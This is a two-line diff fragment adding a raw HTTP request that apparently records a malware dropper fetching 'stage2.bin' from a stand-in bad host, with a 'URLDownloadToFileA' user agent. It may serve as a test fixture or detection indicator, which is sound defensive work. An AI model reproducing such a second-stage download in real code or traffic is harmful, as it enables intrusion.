@@ -1,0 +1,2 @@
+GET http://update.example-bad.test/stage2.bin
+User-Agent: URLDownloadToFileA
